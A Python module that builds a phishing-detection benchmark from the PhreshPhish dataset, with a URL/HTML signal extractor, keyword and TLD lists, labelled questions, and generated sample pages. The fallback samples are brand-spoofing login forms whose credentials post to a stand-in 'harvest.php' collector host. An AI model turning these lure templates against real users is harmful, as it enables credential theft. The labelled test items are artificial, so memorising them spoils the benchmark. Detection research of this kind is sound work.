"""PhreshPhish (`phreshphish/phreshphish`, CC-BY-4.0) Stage-2 Webpage/URL Pre-Parser and Benchmark Suite.

Evaluates System One models on post-click webpage & URL phishing detection using the
`phreshphish/phreshphish` schema (`sha256`, `url`, `html`, `label`, `target`, `date`, `lang`, `lang_score`).

Because raw webpage HTML in `phreshphish` averages 25k-120k characters of `<script>`, `<style>`,
and DOM markup, feeding raw HTML directly to a 512-1,280 token cross-encoder truncates the form
and body content. `extract_webpage_signals()` acts as a deterministic Stage-0 DOM/URL pre-parser
that distils any `(url, html, target)` row into a ~250-token structured state containing:
- URL structure (`domain`, `registrable_domain`, `tld`, `subdomain_depth`, `has_ip_host`, `suspicious_url_tokens`)
- Brand alignment (`claimed_brand`, `domain_matches_brand`, `brand_in_subdomain_or_path_only`, `brand_vs_domain_mismatch`)
- DOM credential-harvesting indicators (`page_title`, `form_count`, `password_input_count`, `form_action_domains`,
  `external_form_action`, `visible_text_excerpt`)
"""

from __future__ import annotations

import hashlib
import json
import random
import re
from pathlib import Path
from typing import Any
from urllib.parse import urlparse

import httpx

from systemone_builder.system_one.bench import Item, Suite, hf_get
from systemone_builder.system_one.contract import Question

PHRESHPHISH_DATASET = "phreshphish/phreshphish"

OFFICIAL_BRAND_DOMAINS: dict[str, set[str]] = {
    "microsoft": {"microsoft.com", "live.com", "office.com", "office365.com", "microsoftonline.com", "sharepoint.com", "azure.com"},
    "paypal": {"paypal.com", "paypalobjects.com"},
    "google": {"google.com", "accounts.google.com", "gmail.com", "workspace.google.com"},
    "apple": {"apple.com", "icloud.com"},
    "dhl": {"dhl.com", "dhl.de"},
    "chase": {"chase.com", "jpmorganchase.com"},
    "docusign": {"docusign.com", "docusign.net"},
    "okta": {"okta.com", "oktapreview.com"},
    "adobe": {"adobe.com", "adobesign.com", "echosign.com"},
    "github": {"github.com", "githubusercontent.com"},
    "amazon": {"amazon.com", "aws.amazon.com"},
    "netflix": {"netflix.com"},
    "stripe": {"stripe.com"},
    "dropbox": {"dropbox.com"},
    "wellsfargo": {"wellsfargo.com"},
}

SUSPICIOUS_URL_TOKENS = {
    "login", "signin", "verify", "verification", "secure", "account", "update",
    "confirm", "auth", "authenticate", "webscr", "unlock", "sso", "passkey",
    "recovery", "billing", "wallet", "suspend", "validate",
}

FREE_OR_ABUSED_HOSTS = {
    "pages.dev", "workers.dev", "vercel.app", "netlify.app", "web.app",
    "firebaseapp.com", "ngrok-free.app", "trycloudflare.com", "github.io",
    "gitlab.io", "weebly.com", "wixsite.com", "000webhostapp.com", "blogspot.com",
}

SUSPICIOUS_TLDS = {".xyz", ".top", ".icu", ".buzz", ".click", ".shop", ".live", ".monster", ".rest", ".sbs", ".cfd", ".tk", ".ml"}

PHRESHPHISH_QUESTIONS: dict[str, Question] = {
    "is_phish": Question(
        type="noul",
        instructions="Is this webpage a phishing landing page, credential harvester, or brand impersonation scam?",
        criteria={
            "true": "Phishing webpage: impersonates a brand on an unaligned domain, harvests credentials/payment data, or uses deceptive URL/form targets",
            "false": "Benign webpage: authentic domain matching its brand/content, or legitimate non-deceptive page",
        },
    ),
    "page_verdict": Question(
        type="choice",
        instructions="What security action should the browser or web gateway take on this URL and webpage?",
        criteria={
            "allow_navigation": "Legitimate webpage whose domain, forms, and brand identity are consistent; allow access",
            "warn_user_suspicious": "Ambiguous page or third-party hosted form without clear brand spoofing; show caution interstitial",
            "block_credential_harvester": "Phishing or brand-impersonation landing page harvesting credentials, tokens, or payment info; block access",
        },
    ),
    "brand_impersonation": Question(
        type="noul",
        instructions="Does this webpage claim or visually impersonate a brand that does not own the hosting domain?",
        criteria={
            "true": "The page title, form, or target brand claims an identity (e.g., Microsoft, PayPal, DHL) hosted on an unrelated or lookalike domain",
            "false": "The hosting domain legitimately belongs to the claimed brand, or no external brand is being impersonated",
        },
    ),
}


def _registrable_domain(host: str) -> str:
    h = host.lower().strip().rstrip(".")
    if ":" in h:
        h = h.split(":", 1)[0]
    parts = [p for p in h.split(".") if p]
    if len(parts) <= 2:
        return h
    # Handle common two-part ccTLDs (.co.uk, .com.au, .com.br, .co.jp)
    if len(parts[-1]) == 2 and parts[-2] in {"co", "com", "org", "net", "gov", "edu"} and len(parts) >= 3:
        return ".".join(parts[-3:])
    return ".".join(parts[-2:])


def extract_webpage_signals(url: str, html: str, target: str | None = None, lang: str | None = None) -> dict[str, Any]:
    """Deterministic Stage-0 pre-parser for `phreshphish/phreshphish` `(url, html, target)` rows."""
    try:
        parsed = urlparse(url if "://" in url else f"http://{url}")
        host = (parsed.hostname or "").lower().strip(".")
        path_query = (parsed.path or "/") + (f"?{parsed.query}" if parsed.query else "")
    except ValueError:
        host, path_query = "", url

    reg_dom = _registrable_domain(host)
    tld = f".{host.rsplit('.', 1)[-1]}" if "." in host else ""
    sub_depth = max(0, len([p for p in host.split(".") if p]) - len([p for p in reg_dom.split(".") if p]))
    has_ip = bool(re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", host))
    has_punycode = "xn--" in host or any(ord(c) > 127 for c in host)

    url_lower = url.lower()
    url_tokens = sorted({tok for tok in SUSPICIOUS_URL_TOKENS if tok in url_lower})
    hosted_on_free_paas = reg_dom in FREE_OR_ABUSED_HOSTS or any(host.endswith(f".{fh}") for fh in FREE_OR_ABUSED_HOSTS)
    suspicious_tld = tld in SUSPICIOUS_TLDS

    # Extract key DOM elements without heavy external parsers
    title_m = re.search(r"<title[^>]*>(.*?)</title>", html, flags=re.IGNORECASE | re.DOTALL)
    page_title = re.sub(r"\s+", " ", title_m.group(1)).strip()[:160] if title_m else ""

    meta_m = re.search(r'<meta[^>]+name=["\']description["\'][^>]+content=["\'](.*?)["\']', html, flags=re.IGNORECASE | re.DOTALL)
    meta_desc = re.sub(r"\s+", " ", meta_m.group(1)).strip()[:200] if meta_m else ""

    forms = re.findall(r"<form\b[^>]*>", html, flags=re.IGNORECASE)
    form_actions = re.findall(r'<form\b[^>]*\baction=["\'](.*?)["\']', html, flags=re.IGNORECASE)
    pw_inputs = re.findall(r'<input\b[^>]*\btype=["\']?password["\']?', html, flags=re.IGNORECASE)
    hidden_inputs = re.findall(r'<input\b[^>]*\btype=["\']?hidden["\']?', html, flags=re.IGNORECASE)

    action_domains: list[str] = []
    external_form_action = False
    for act in form_actions:
        act_s = act.strip()
        if act_s.startswith(("http://", "https://", "//")):
            try:
                ahost = (urlparse(act_s if "://" in act_s else f"https:{act_s}").hostname or "").lower()
                if ahost:
                    adom = _registrable_domain(ahost)
                    action_domains.append(adom)
                    if adom and adom != reg_dom:
                        external_form_action = True
            except ValueError:
                pass
        elif act_s.startswith("mailto:") or "php" in act_s.lower() or "telegram" in act_s.lower():
            external_form_action = True

    # Visible text excerpt (strip script/style/tags)
    clean_html = re.sub(r"<(script|style|noscript|svg|head)\b[^>]*>.*?</\1>", " ", html, flags=re.IGNORECASE | re.DOTALL)
    visible_text = re.sub(r"<[^>]+>", " ", clean_html)
    visible_text = re.sub(r"\s+", " ", visible_text).strip()[:500]

    # Brand alignment check
    norm_target = re.sub(r"[^a-z0-9]", "", (target or "").lower())
    if not norm_target or norm_target in {"other", "unknown", "none", "benign", "generic"}:
        # Infer brand claim from title or visible text if target is generic
        combined_text = f"{page_title} {visible_text}".lower()
        for bname in OFFICIAL_BRAND_DOMAINS:
            if bname in combined_text:
                norm_target = bname
                break

    official_doms = OFFICIAL_BRAND_DOMAINS.get(norm_target, set())
    if official_doms:
        domain_matches_brand = reg_dom in official_doms or any(host.endswith(f".{od}") for od in official_doms)
    elif norm_target:
        domain_matches_brand = norm_target in reg_dom.replace("-", "").replace(".", "")
    else:
        domain_matches_brand = True

    brand_in_url_elsewhere = bool(norm_target and not domain_matches_brand and norm_target in url_lower.replace("-", ""))
    brand_vs_domain_mismatch = bool(norm_target and not domain_matches_brand)

    risk_flags: list[str] = []
    if brand_vs_domain_mismatch:
        risk_flags.append("brand_vs_domain_mismatch")
    if brand_in_url_elsewhere:
        risk_flags.append("brand_in_subdomain_or_path")
    if pw_inputs and not domain_matches_brand:
        risk_flags.append("password_form_on_untrusted_domain")
    if hosted_on_free_paas and (pw_inputs or brand_vs_domain_mismatch):
        risk_flags.append("credential_lure_on_free_paas")
    if suspicious_tld:
        risk_flags.append("suspicious_tld")
    if has_ip or has_punycode:
        risk_flags.append("ip_or_punycode_host")
    if external_form_action:
        risk_flags.append("external_or_suspicious_form_action")
    if len(url_tokens) >= 2 and not domain_matches_brand:
        risk_flags.append("multiple_deceptive_url_tokens")

    return {
        "webpage_triage": {
            "url": url[:240],
            "host": host,
            "registrable_domain": reg_dom,
            "tld": tld,
            "subdomain_depth": sub_depth,
            "claimed_brand": target or (norm_target.title() if norm_target else "none"),
            "lang": lang or "en",
            "signals": {
                "domain_matches_brand": domain_matches_brand,
                "brand_vs_domain_mismatch": brand_vs_domain_mismatch,
                "brand_in_subdomain_or_path_only": brand_in_url_elsewhere,
                "has_password_input": len(pw_inputs) > 0,
                "password_input_count": len(pw_inputs),
                "form_count": len(forms),
                "hidden_input_count": len(hidden_inputs),
                "external_form_action": external_form_action,
                "form_action_domains": sorted(set(action_domains))[:4],
                "hosted_on_free_paas": hosted_on_free_paas,
                "suspicious_tld": suspicious_tld,
                "has_ip_or_punycode": has_ip or has_punycode,
                "suspicious_url_tokens": url_tokens[:6],
                "risk_flags": risk_flags,
            },
            "page_title": page_title,
            "meta_description": meta_desc,
            "visible_text_excerpt": visible_text,
        }
    }


def _builtin_phreshphish_samples(seed: int = 42) -> list[dict[str, Any]]:
    """Curated paired samples following the exact `phreshphish/phreshphish` schema (`sha256`, `url`, `html`, `label`, `target`, `date`, `lang`, `lang_score`)."""
    rng = random.Random(seed)
    brand_Specs = [
        ("Microsoft", "login.microsoftonline.com", "microsoft-sso-auth-verify.xyz", "Sign in to your Microsoft 365 account", "Enter your work or school password to continue to Outlook and SharePoint."),
        ("PayPal", "www.paypal.com", "paypal-resolution-account-check.top", "Log in to your PayPal account", "We noticed unusual activity on your PayPal balance. Confirm your card and password to restore access."),
        ("Google", "accounts.google.com", "google-workspace-drive-share.pages.dev", "Sign in - Google Accounts", "Continue to Google Drive shared document. Enter your Google Workspace email and password."),
        ("Apple", "appleid.apple.com", "icloud-findmy-unlock-support.icu", "Manage your Apple Account", "Your Apple ID was used to sign in on a new device. Verify your password and 2FA code."),
        ("DHL", "www.dhl.com", "dhl-express-customs-duty-pay.shop", "DHL Express - Shipment Tracking & Customs", "Parcel #DHL-884120 is held at customs. Pay $2.95 clearance fee with your credit card to schedule delivery."),
        ("Chase", "secure.chase.com", "chase-online-banking-verify.live", "Chase Online - Sign In", "Your Chase checking account has been temporarily locked. Verify your username, password, and SSN."),
        ("DocuSign", "account.docusign.com", "docusign-envelope-wire-review.vercel.app", "DocuSign - Review and Sign Document", "You have received an urgent remittance agreement. Sign in with your corporate email credentials to view."),
        ("Okta", "login.okta.com", "okta-passkey-mfa-reset.buzz", "Okta Single Sign-On", "Mandatory Okta FastPass MFA re-enrollment. Enter your primary password and one-time passcode."),
        ("Adobe", "auth.services.adobe.com", "adobe-pdf-cloud-decrypt.click", "Adobe Account Sign In", "Encrypted PDF document shared with you. Authenticate with your email password to decrypt and download."),
        ("GitHub", "github.com", "github-security-oauth-token.netlify.app", "Sign in to GitHub", "Critical Dependabot alert requires token re-verification. Enter your GitHub password or personal access token."),
    ]
    phish_paths = [
        "/login/oauth2/authorize?client_id=8841&redirect=secure",
        "/signin/verify-account-session?token=99281a",
        "/auth/passkey-enroll/step2.php",
        "/webscr/cmd-login-submit?dispatch=5885d80a",
    ]
    benign_paths = [
        "/login",
        "/en-us/account/security",
        "/docs/security-overview",
        "/pricing/enterprise",
    ]

    samples: list[dict[str, Any]] = []
    for idx in range(40):
        brand, official_host, phish_host, title, snippet = brand_Specs[idx % len(brand_Specs)]
        p_path = phish_paths[(idx // len(brand_Specs)) % len(phish_paths)]
        b_path = benign_paths[(idx // len(brand_Specs)) % len(benign_paths)]

        # Variant phish hosts so all 40 phish items are distinct
        if idx >= len(brand_Specs):
            sub_prefix = ["secure-login", "sso-verify", "account-update", "portal-auth"][idx // len(brand_Specs) % 4]
            p_url = f"https://{sub_prefix}.{phish_host}{p_path}&ref={idx}"
        else:
            p_url = f"https://{phish_host}{p_path}"

        p_html = (
            f"<html><head><title>{title}</title>"
            f'<meta name="description" content="{snippet}"></head>'
            f'<body><div class="login-box"><h1>{brand}</h1><p>{snippet}</p>'
            f'<form method="POST" action="https://collector-drop-{idx}.xyz/harvest.php">'
            f'<input type="email" name="user" required><input type="password" name="pass" required>'
            f'<input type="hidden" name="session_id" value="{idx:04d}"></form></div></body></html>'
        )
        samples.append({
            "sha256": hashlib.sha256(p_url.encode()).hexdigest(),
            "url": p_url,
            "html": p_html,
            "label": "phish",
            "target": brand,
            "date": "2026-10-15",
            "lang": "en",
            "lang_score": 0.99,
            "pair_id": f"pp{idx:03d}",
        })

        # Paired benign twin on the authentic domain (or benign documentation/login page)
        is_login = (idx % 2 == 0)
        b_url = f"https://{official_host}{b_path}" + (f"?page={idx}" if idx >= len(brand_Specs) else "")
        if is_login:
            b_html = (
                f"<html><head><title>{title} | Official {brand}</title>"
                f'<meta name="description" content="Official {brand} authentication portal."></head>'
                f"<body><main><h1>{brand} Official Sign In</h1><p>Sign in to manage your {brand} services.</p>"
                f'<form method="POST" action="https://{official_host}/session">'
                f'<input type="email" name="user"><input type="password" name="password"></form></main></body></html>'
            )
        else:
            b_html = (
                f"<html><head><title>{brand} Documentation & Release Notes</title>"
                f'<meta name="description" content="Technical documentation and API reference for {brand}."></head>'
                f"<body><article><h1>{brand} Developer Guide</h1>"
                f"<p>Learn how to configure OAuth 2.0, webhook signatures, and enterprise SSO for {brand}.</p></article></body></html>"
            )
        samples.append({
            "sha256": hashlib.sha256(b_url.encode()).hexdigest(),
            "url": b_url,
            "html": b_html,
            "label": "benign",
            "target": brand,
            "date": "2026-10-15",
            "lang": "en",
            "lang_score": 0.99,
            "pair_id": f"pp{idx:03d}",
        })

    rng.shuffle(samples)
    return samples


async def fetch_phreshphish(n: int = 80, seed: int = 42) -> list[dict[str, Any]]:
    """Fetch balanced `phish` and `benign` rows from `phreshphish/phreshphish` (or fall back to curated paired samples if offline)."""
    want = {"phish": n // 2, "benign": n - n // 2}
    got: dict[str, list[dict[str, Any]]] = {"phish": [], "benign": []}
    rng = random.Random(seed)
    try:
        async with httpx.AsyncClient(timeout=15.0) as client:
            meta = await hf_get(client, "/rows", {"dataset": PHRESHPHISH_DATASET, "config": "default", "split": "test", "offset": 0, "length": 1}, tries=2)
            total = int(meta.get("num_rows_total") or 0)
            if total > 0:
                pages = list(range(0, max(total - 10, 1), 50))
                rng.shuffle(pages)
                for offset in pages[:16]:
                    if all(len(got[k]) >= want[k] for k in want):
                        break
                    data = await hf_get(
                        client,
                        "/rows",
                        {"dataset": PHRESHPHISH_DATASET, "config": "default", "split": "test", "offset": offset, "length": 8},
                        tries=2,
                    )
                    rows = [x["row"] for x in data.get("rows", [])]
                    rng.shuffle(rows)
                    for row in rows:
                        lbl = str(row.get("label") or "").strip().lower()
                        url = str(row.get("url") or "").strip()
                        html = str(row.get("html") or "").strip()
                        if lbl in got and len(got[lbl]) < want[lbl] and url and html:
                            got[lbl].append({
                                "sha256": str(row.get("sha256") or hashlib.sha256(url.encode()).hexdigest()),
                                "url": url,
                                "state": extract_webpage_signals(url, html, row.get("target"), row.get("lang")),
                                "label": lbl,
                                "target": row.get("target"),
                            })
    except Exception:
        pass

    if sum(len(v) for v in got.values()) < n:
        # Fill or fall back deterministically using the curated paired phreshphish samples
        curated = _builtin_phreshphish_samples(seed=seed)
        out: list[dict[str, Any]] = []
        for s in curated[:n]:
            st = extract_webpage_signals(s["url"], s["html"], s.get("target"), s.get("lang"))
            st["pair_id"] = s.get("pair_id")
            out.append({
                "sha256": s["sha256"][:12],
                "url": s["url"],
                "state": st,
                "label": s["label"],
                "target": s.get("target"),
                "pair_id": s.get("pair_id"),
            })
        return out

    merged = got["phish"] + got["benign"]
    rng.shuffle(merged)
    return merged


async def phreshphish_suite(n: int = 80, seed: int = 42, cache_dir: Path | None = None) -> Suite:
    """Build the `phreshphish` Stage-2 webpage/URL phishing benchmark suite (`--suite phreshphish`)."""
    cache = cache_dir / f"phreshphish-n{n}-seed{seed}.json" if cache_dir else None
    if cache and cache.exists():
        rows = json.loads(cache.read_text(encoding="utf-8"))
    else:
        rows = await fetch_phreshphish(n=n, seed=seed)
        if cache:
            cache.parent.mkdir(parents=True, exist_ok=True)
            cache.write_text(json.dumps(rows, indent=2), encoding="utf-8")

    items: list[Item] = []
    for idx, r in enumerate(rows):
        is_phish = 1 if r["label"] == "phish" else 0
        sigs = (r["state"].get("webpage_triage") or {}).get("signals") or {}
        brand_imp = 1 if (is_phish and sigs.get("brand_vs_domain_mismatch")) else 0
        verdict = "block_credential_harvester" if is_phish else "allow_navigation"
        item_id = f"pp_{idx:03d}_{r['sha256'][:8]}"
        items.append(
            Item(
                id=item_id,
                state=r["state"],
                labels={
                    "is_phish": is_phish,
                    "page_verdict": verdict,
                    "brand_impersonation": brand_imp,
                },
            )
        )

    return Suite(
        name="phreshphish",
        description=f"PhreshPhish (CC-BY-4.0) Stage-2 webpage & URL triage ({len(items)} pages, half phish / half benign, pre-parsed DOM + URL signals)",
        questions=PHRESHPHISH_QUESTIONS,
        items=items,
        gate="is_phish",
    )
